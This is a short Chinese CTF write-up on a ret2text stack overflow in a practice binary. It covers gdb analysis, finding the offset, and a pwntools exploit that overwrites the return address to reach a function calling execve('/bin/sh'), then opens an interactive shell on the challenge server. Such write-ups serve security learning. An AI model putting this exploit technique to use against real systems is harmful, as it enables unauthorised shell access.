---
title: Ctfplus | stack overflow
published: 2026-03-01
description: ''
image: ''
tags: [Pwn, ret2text]
category: 'CTF'
draft: false 
lang: ''
---

- gdb分析附件，查看`main`：
    ![alt text](image-49.png)
    可以看到此处通过`read`读取输入到栈缓冲区

- 查看该程序所有函数：
    ![alt text](image-50.png)
    可以看到`/bin/sh`就在`whhhat`函数中并且通过`execve`来调用

    所以可以通过`read`进行数据写入造成栈溢出，来调用`whhhat`函数

- `whhhat`函数地址：
    ![alt text](image-51.png)

- 通过对`main`函数分析或者`cyclic`都可以得出溢出范围：
    ![alt text](image-52.png)
    ![alt text](image-53.png)

- EXP：
    ```python
    from pwn import *

    a = remote("nc1.ctfplus.cn", 47523)
    # a = process("./hello")

    payload = b"A" * 56 + p64(0x4011F7)

    a.sendline(payload)
    a.interactive()
    ```
    ![alt text](image-54.png)